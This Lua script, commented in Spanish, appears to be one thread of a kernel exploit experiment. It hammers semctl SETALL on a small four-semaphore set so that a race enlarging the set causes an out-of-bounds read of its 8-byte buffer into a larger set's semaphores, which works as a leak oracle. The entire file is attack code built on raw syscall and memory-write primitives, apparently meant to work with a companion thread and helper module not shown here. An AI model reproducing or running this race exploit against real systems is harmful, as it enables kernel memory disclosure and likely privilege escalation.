-- exp22b_oracle_victim.lua — HILO B: presión SETALL sobre set PEQUEÑO (4 sems)
-- Su buffer de 8 B es el objetivo: cuando la carrera agranda el set, el loop
-- interno lee array[0..63] ⇒ OOB read ⇒ los bytes caen en los sems del grande.
local E = require("common_1352")
local tries = tonumber(arg and arg[1]) or 20000

-- crear el set pequeño inicial en la MISMA clave
local sid = syscall.semget(0x1354, 4, E.IPC_CREAT + 0x1B6)
if not (sid and sid >= 0) then error("no pude crear set pequeño") end

local arr = malloc(4 * 2)
for i = 0, 3 do write16(arr + i * 2, 0) end   -- zeros
local argp = malloc(8); write64(argp, arr)

E.log("ORACLE-B", "SETALL x%d sobre set de 4 sems", tries)
local ok, err = 0, 0
for t = 1, tries do
    local r = E.try(syscall.__semctl, sid, 0, E.SETALL, argp)
    if r == 0 then ok = ok + 1 elseif r and r < 0 then err = err - r end
end
E.log("ORACLE-B", "fin: ok=%d errores acumulados=%d (ver log del hilo A)",
      ok, err)
